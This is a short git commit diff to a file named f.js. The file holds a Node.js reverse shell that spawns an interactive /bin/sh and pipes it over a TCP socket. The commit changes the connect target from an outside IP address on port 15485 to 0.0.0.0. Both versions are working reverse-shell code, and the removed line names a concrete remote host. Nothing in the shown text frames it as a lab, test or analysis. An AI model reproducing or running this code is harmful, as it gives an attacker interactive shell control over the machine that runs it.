1ab022dc8e2f2299d2f1454ac325b18c199a6b92
Aaki123-star <aaki987@proton.me>
2025-12-16 06:45:41 -0500

    Update f.js

--- f.js
+++ f.js
@@ -3,7 +3,7 @@
       cp = require("child_process"),
       sh = cp.spawn("/bin/sh", ["-i"]);
   var client = new net.Socket();
-  client.connect(15485, "38.60.197.238", function(){
+  client.connect(15485, "0.0.0.0", function(){
     client.pipe(sh.stdin);
     sh.stdout.pipe(client);
     sh.stderr.pipe(client);
